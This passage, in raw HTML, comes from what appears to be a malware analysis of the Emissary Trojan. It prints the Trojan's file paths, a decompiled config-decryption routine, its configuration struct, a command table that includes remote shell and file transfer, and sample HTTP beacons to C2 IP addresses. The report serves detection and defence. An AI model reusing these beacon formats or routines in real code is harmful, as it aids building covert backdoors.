						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e2f588240152-1"><span class="crayon-ta">%</span><span class="crayon-i">TEMP</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-cn">000IISA758C8FEAE5F.TMP</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Log</span><span class="crayon-h"> </span><span class="crayon-t">file</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e2f588240152-2">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e2f588240152-3"><span class="crayon-ta">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">LocalData</span><span class="crayon-sy">\</span><span class="crayon-cn">75BD50EC.DAT</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Configuration</span><span class="crayon-h"> </span><span class="crayon-t">file</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e2f588240152-4">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e2f588240152-5"><span class="crayon-sy">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">LocalData</span><span class="crayon-sy">\</span><span class="crayon-i">A08E81B411</span><span class="crayon-sy">.</span><span class="crayon-i">DAT</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">Emissary </span><span class="crayon-i">DLL</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0019 seconds] -->
<p>This version of Emissary is designed to be injected into an Internet Explorer process by its associated loader Trojan, which marks the first time Emissary executes through DLL injection.</p>
<p>This version of Emissary also has a different configuration structure than prior versions. The configuration is no longer stored in the registry; rather it is saved to a file named 75BD50EC.DAT. The Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will decrypt with a new algorithm as seen in the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e30621920631" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
SetFilePointer(h_config_file_1, 0x488, 0, 0);
ReadFile(h_config_file, buffer_for_config, 132u, &amp;NumberOfBytesRead, 0);
CloseHandle(h_config_file);
srand(0xA03u);
iteration_count = 0;
do
  *(buffer_for_config + iteration_count++) ^= rand() % 128;
while ( iteration_count &lt; 0x84 );</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e30621920631-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e30621920631-2">2</div><div class="crayon-num" data-line="crayon-671986a833e30621920631-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e30621920631-4">4</div><div class="crayon-num" data-line="crayon-671986a833e30621920631-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e30621920631-6">6</div><div class="crayon-num" data-line="crayon-671986a833e30621920631-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e30621920631-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e30621920631-1"><span class="crayon-e">SetFilePointer</span><span class="crayon-sy">(</span><span class="crayon-i">h_config_file_1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x488</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e30621920631-2"><span class="crayon-e">ReadFile</span><span class="crayon-sy">(</span><span class="crayon-i">h_config_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">buffer_for_config</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">132u</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;NumberOfBytesRead, 0);</span></div><div class="crayon-line" id="crayon-671986a833e30621920631-3"><span class="crayon-e">CloseHandle</span><span class="crayon-sy">(</span><span class="crayon-i">h_config_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e30621920631-4"><span class="crayon-e">srand</span><span class="crayon-sy">(</span><span class="crayon-cn">0xA03u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e30621920631-5"><span class="crayon-i">iteration_count</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e30621920631-6"><span class="crayon-st">do</span></div><div class="crayon-line" id="crayon-671986a833e30621920631-7"><span class="crayon-h">&nbsp;&nbsp;</span>*<span class="crayon-sy">(</span><span class="crayon-i">buffer_for_config</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-i">iteration_count</span>++<span class="crayon-sy">)</span><span class="crayon-h"> </span>^=<span class="crayon-h"> </span><span class="crayon-e">rand</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">%</span><span class="crayon-h"> </span><span class="crayon-cn">128</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e30621920631-8"><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">iteration_count</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">0x84</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The configuration structure has also changed as well, with Emissary now using the following structure:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e31700652816" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
struct emissary_new_config {
WORD Emissary_version_major;
WORD Emissary_version_minor;
CHAR[36] GUID_for_sample;
WORD Unknown1;
CHAR[128] Server1;
CHAR[128] Server2;
CHAR[128] Server3;
CHAR[128] CampaignName;
CHAR[550] Unknown2;
WORD Delay_interval_seconds;
};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e31700652816-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e31700652816-2">2</div><div class="crayon-num" data-line="crayon-671986a833e31700652816-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e31700652816-4">4</div><div class="crayon-num" data-line="crayon-671986a833e31700652816-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e31700652816-6">6</div><div class="crayon-num" data-line="crayon-671986a833e31700652816-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e31700652816-8">8</div><div class="crayon-num" data-line="crayon-671986a833e31700652816-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e31700652816-10">10</div><div class="crayon-num" data-line="crayon-671986a833e31700652816-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e31700652816-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e31700652816-1"><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">emissary_new_config</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e31700652816-2"><span class="crayon-t">WORD</span><span class="crayon-h"> </span><span class="crayon-i">Emissary_version_major</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e31700652816-3"><span class="crayon-t">WORD</span><span class="crayon-h"> </span><span class="crayon-i">Emissary_version_minor</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e31700652816-4"><span class="crayon-t">CHAR</span><span class="crayon-sy">[</span><span class="crayon-cn">36</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">GUID_for_sample</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e31700652816-5"><span class="crayon-t">WORD</span><span class="crayon-h"> </span><span class="crayon-i">Unknown1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e31700652816-6"><span class="crayon-t">CHAR</span><span class="crayon-sy">[</span><span class="crayon-cn">128</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">Server1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e31700652816-7"><span class="crayon-t">CHAR</span><span class="crayon-sy">[</span><span class="crayon-cn">128</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">Server2</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e31700652816-8"><span class="crayon-t">CHAR</span><span class="crayon-sy">[</span><span class="crayon-cn">128</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">Server3</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e31700652816-9"><span class="crayon-t">CHAR</span><span class="crayon-sy">[</span><span class="crayon-cn">128</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">CampaignName</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e31700652816-10"><span class="crayon-t">CHAR</span><span class="crayon-sy">[</span><span class="crayon-cn">550</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">Unknown2</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-671986a833e31700652816-11"><span class="crayon-t">WORD</span><span class="crayon-h"> </span><span class="crayon-i">Delay_interval_seconds</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e31700652816-12"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>This version of Emissary also introduced a new command handler that uses number-based commands instead of the GUID commands seen in prior versions of Emissary. The functionality of the commands are the same, however, the commands themselves are invoked using a number. Table 2 contains a list of available commands and a brief description of the functionality carried out by the command.</p>
<table style="height: 302px;" width="729">
<tbody>
<tr>
<td width="104"><strong>Command</strong></td>
<td width="338"><strong>Description</strong></td>
</tr>
<tr>
<td width="104">102</td>
<td width="338">Upload a file to the C2 server.</td>
</tr>
<tr>
<td width="104">103</td>
<td width="338">Executes a specified command.</td>
</tr>
<tr>
<td width="104">104</td>
<td width="338">Download file from the C2 server.</td>
</tr>
<tr>
<td width="104">105</td>
<td width="338">Update configuration file.</td>
</tr>
<tr>
<td width="104">106</td>
<td width="338">Create a remote shell.</td>
</tr>
<tr>
<td width="104">107</td>
<td width="338">Updates the Trojan with a new executable.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;">Table 2: New Emissary command handler</p>
<p>The network beacon sent from this version of Emissary is very similar to the beacon first introduced in Emissary version 2.0; however, the "op" value of "101" is hardcoded for the beacon and replaces the GUID based op designator to match the new command handler. The following is an example of the network beacon generated by this version of Emissary:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e32314378520" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /default.aspx HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: 101.55.33.92
Cache-Control: no-cache
Cookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5; op=101</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e32314378520-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e32314378520-2">2</div><div class="crayon-num" data-line="crayon-671986a833e32314378520-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e32314378520-4">4</div><div class="crayon-num" data-line="crayon-671986a833e32314378520-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e32314378520-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span>/<span class="crayon-st">default</span><span class="crayon-sy">.</span><span class="crayon-e">aspx </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e32314378520-2"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">4.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">compatible</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">MSIE</span><span class="crayon-h"> </span><span class="crayon-cn">7.0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-671986a833e32314378520-3"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">101.55.33.92</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e32314378520-4"><span class="crayon-i">Cache</span>-<span class="crayon-i">Control</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span>-<span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-671986a833e32314378520-5"><span class="crayon-i">Cookie</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">guid</span>=<span class="crayon-i">cae5e213</span>-<span class="crayon-cn">395a</span>-<span class="crayon-cn">4023</span>-<span class="crayon-cn">9a12</span>-<span class="crayon-i">f78d3c4718e5</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">op</span>=<span class="crayon-cn">101</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<h4>Version 5.0</h4>
<p><strong>Date: 8/25/2015</strong></p>
<p>SHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original Name: WinDLL.dll</p>
<p>Emissary version 5.0 closely resembles the out-of-order version 3.0 sample, which suggests that the malware author just forgot to change the version number of the out of order sample. While the configuration and Emissary DLL filenames used by the version 5.0 Emissary sample are the same as the out-of-order version 3.0 sample, the log file name differs but only slightly, as seen in the following list of related files:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e33015474306" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%TEMP%\000A758C8FEAE5F.TMP -&gt; Log File
%APPDATA%\LocalData\75BD50EC.DAT -&gt; Configuration file
%APPDATA%\LocalData\A08E81B411.DAT -&gt; Emissary DLL
%APPDATA%\LocalData\ishelp.dll -&gt; Loader DLL</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e33015474306-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e33015474306-2">2</div><div class="crayon-num" data-line="crayon-671986a833e33015474306-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e33015474306-4">4</div><div class="crayon-num" data-line="crayon-671986a833e33015474306-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e33015474306-6">6</div><div class="crayon-num" data-line="crayon-671986a833e33015474306-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e33015474306-1"><span class="crayon-ta">%</span><span class="crayon-i">TEMP</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-cn">000A758C8FEAE5F.TMP</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Log</span><span class="crayon-h"> </span><span class="crayon-t">File</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e33015474306-2">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e33015474306-3"><span class="crayon-ta">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">LocalData</span><span class="crayon-sy">\</span><span class="crayon-cn">75BD50EC.DAT</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Configuration</span><span class="crayon-h"> </span><span class="crayon-t">file</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e33015474306-4">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e33015474306-5"><span class="crayon-ta">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">LocalData</span><span class="crayon-sy">\</span><span class="crayon-i">A08E81B411</span><span class="crayon-sy">.</span><span class="crayon-i">DAT</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">Emissary</span><span class="crayon-h"> </span><span class="crayon-i">DLL</span></div><div class="crayon-line crayon-striped-line" id="crayon-671986a833e33015474306-6">&nbsp;</div><div class="crayon-line" id="crayon-671986a833e33015474306-7"><span class="crayon-sy">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">LocalData</span><span class="crayon-sy">\</span><span class="crayon-i">ishelp</span><span class="crayon-sy">.</span><span class="crayon-i">dll</span><span class="crayon-h"> </span>-<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">Loader </span><span class="crayon-i">DLL</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Version 5.0 uses numbers within its command handler and the same configuration structure as the out-of-order version 3.0. The only major change in 5.0 is the ability to obtain a compromised system's external IP address by performing an HTTP GET request to "http://showip.net/index.php". The code will parse the response from this webserver for the following to obtain the system's IP address:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e34665805512" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;input id="checkip" type="text" name="check_ip" value="[IP address parsed]" /&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e34665805512-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-671986a833e34665805512-1"><span class="crayon-h">&lt;</span><span class="crayon-e">input </span><span class="crayon-i">id</span>=<span class="crayon-s">"checkip"</span><span class="crayon-h"> </span><span class="crayon-i">type</span>=<span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-i">name</span>=<span class="crayon-s">"check_ip"</span><span class="crayon-h"> </span><span class="crayon-i">value</span>=<span class="crayon-s">"[IP address parsed]"</span><span class="crayon-h"> </span>/<span class="crayon-h">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The SID value sent from the C2 server is encrypted using an algorithm that uses the XOR operation on the data using 0x76 as the key on the first byte and the resulting cleartext byte as the key on the next byte and so on. The network beacon sent from this version of Emissary visually resembles the out-of-order version, with the addition of a field "SHO" that contains the IP address of the compromised host. The following is an example of the Emissary version 5.0 network beacon, which is also the same in versions 5.1, 5.3 and 5.4 as well:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-671986a833e35854996712" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /default.aspx HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: 101.55.33.95
Cache-Control: no-cache
Cookie: guid=8cdef38c-808a-4e29-af6e-7386f02d28f1; op=101; SHO=172.16.107.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-671986a833e35854996712-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e35854996712-2">2</div><div class="crayon-num" data-line="crayon-671986a833e35854996712-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-671986a833e35854996712-4">4</div><div class="crayon-num" data-line="crayon-671986a833e35854996712-5">5</div></div>
				</td>
